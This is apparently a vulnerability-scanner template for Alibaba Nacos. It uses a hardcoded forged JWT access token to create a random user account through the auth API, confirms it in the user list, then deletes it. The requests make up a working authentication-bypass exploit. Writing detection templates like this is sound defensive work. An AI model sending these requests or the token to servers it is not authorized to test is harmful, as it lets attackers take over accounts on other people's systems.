id: alibaba-nacos-unsafe-config

info:
  name: Alibaba Nacos Unsafe Configuration
  author: d4rksec
  severity: high
  description: |
    This template detects an unsafe configuration vulnerability in Alibaba Nacos, allowing unauthorized user account manipulations.

variables:
  r1: "{{rand_text_alphanumeric(16)}}"
  r2: "{{rand_text_alphanumeric(16)}}"
  token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q"

http:
  - id: create-user
    method: POST
    path:
      - "/nacos/v1/auth/users/?username={{r1}}&password={{r2}}&accessToken={{token}}"
      - "/v1/auth/users/?username={{r1}}&password={{r2}}&accessToken={{token}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "create user ok!"

  - id: list-users
    method: GET
    path:
      - "/nacos/v1/auth/users/?pageNo=1&pageSize=999&accessToken={{token}}"
      - "/v1/auth/users/?pageNo=1&pageSize=999&accessToken={{token}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{r1}}"

  - id: delete-user
    method: DELETE
    path:
      - "/nacos/v1/auth/users/?username={{r1}}&accessToken={{token}}"
      - "/v1/auth/users/?username={{r1}}&accessToken={{token}}"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "delete user ok!"
